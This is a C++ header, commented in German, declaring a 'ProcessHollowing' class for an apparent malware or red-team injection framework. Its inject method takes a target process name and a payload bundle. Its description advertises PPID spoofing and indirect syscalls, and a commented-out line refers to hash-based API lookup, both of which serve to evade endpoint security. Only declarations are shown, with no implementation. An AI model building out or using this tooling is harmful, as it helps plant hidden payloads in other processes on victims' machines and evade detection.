#ifndef PROCESS_HOLLOWING_H
#define PROCESS_HOLLOWING_H

#include "I_InjectionTechnique.h"
#include <windows.h>
#include <winternl.h>
#include "InjectionResult.h"

// Wiederherstellen der Syscall-Struktur
struct SyscallData {
    DWORD syscall_id;
    PVOID syscall_address;
};

class ProcessHollowing : public I_InjectionTechnique {
public:
    ProcessHollowing(HMODULE hNtdll);
    ~ProcessHollowing() = default;

    InjectionResult inject(
        const std::string& processName, 
        const std::vector<unsigned char>& payloadBundle,
        size_t codeOffset
    ) override;

    const char* getName() const override { return "Process Hollowing (mit PPID Spoofing & Indirect Syscalls)"; }

private:
    bool resolveSyscalls();
    
    // Entferne die doppelten Deklarationen, die jetzt in util.h sind
    // DWORD getProcessIdByName(const std::string& processName);
    // PVOID getProcAddressByHash(HMODULE hModule, DWORD functionHash);

    HMODULE hNtdll;
};

#endif // PROCESS_HOLLOWING_H 